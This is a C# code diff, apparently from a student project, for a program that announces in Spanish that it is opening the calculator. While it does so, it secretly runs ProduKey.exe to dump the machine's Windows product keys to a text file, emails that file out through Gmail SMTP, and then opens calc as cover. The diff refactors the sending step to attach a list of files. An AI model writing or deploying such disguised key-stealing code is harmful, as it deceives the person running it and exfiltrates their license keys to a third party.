@@ -13,9 +13,12 @@ namespace TP
     {
         static void Main(string[] args)
         {
-            Console.WriteLine("Abriendo calculadora... Por favor espere.");
-            Helpers.openProduKey();
-            Helpers.sendMail("Prueba", "Estoy probando", "hola.txt");
+            Console.WriteLine("Abriendo calculadora. Por favor espere...");
+            List<string> files = new List<string>();
+
+            files.Add(Helpers.openProduKey());
+
+            Helpers.sendMail("Prueba", "Estoy probando", files);
             Helpers.openCalc();
         }
     }
@@ -27,15 +30,17 @@ namespace TP
             System.Diagnostics.Process.Start("calc");
         }
 
-        public static void openProduKey()
+        public static string openProduKey()
         {
+            string file = "hola.txt";
             ProcessStartInfo startInfo = new ProcessStartInfo();
             startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ProduKey.exe");
-            startInfo.Arguments = @"/stext hola.txt";
+            startInfo.Arguments = @"/stext " + file;
             Process.Start(startInfo);
+            return file;
         }
 
-        public static void sendMail(string subject, string message, string filepath)
+        public static void sendMail(string subject, string message, List<string> files)
         {
             MailMessage mail = new MailMessage();
             SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
@@ -44,10 +49,9 @@ namespace TP
             mail.Subject = subject;
             mail.Body = message;
 
-            if (!string.IsNullOrWhiteSpace(filepath))
+            foreach (var file in files)
             {
-                System.Net.Mail.Attachment attachment;
-                attachment = new System.Net.Mail.Attachment(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, filepath));
+                var attachment = new System.Net.Mail.Attachment(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, file));
                 mail.Attachments.Add(attachment);
             }
 
